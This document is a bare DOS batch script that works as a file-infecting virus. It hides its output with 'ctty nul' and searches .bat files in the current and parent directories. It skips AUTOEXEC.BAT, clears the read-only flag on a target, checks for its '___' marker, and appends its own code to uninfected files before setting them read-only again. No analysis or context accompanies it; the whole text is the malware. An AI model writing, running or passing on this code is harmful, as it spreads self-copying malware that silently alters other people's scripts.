@ctty nul
if "%1" == "" goto q
shift
:n
exit
:q
for %%q in (*.bat ..\*.bat) do set ___=%%q
for %%w in (*.bat ..\*.bat) do if "%___%"=="AUTOEXEC.BAT" goto n
for %%a in (*.bat ..\*.bat) do attrib %___% -r
for %%w in (%___%) do find "___" %%w
if errorlevel 1 type %0 >> %___%
attrib %___% +r
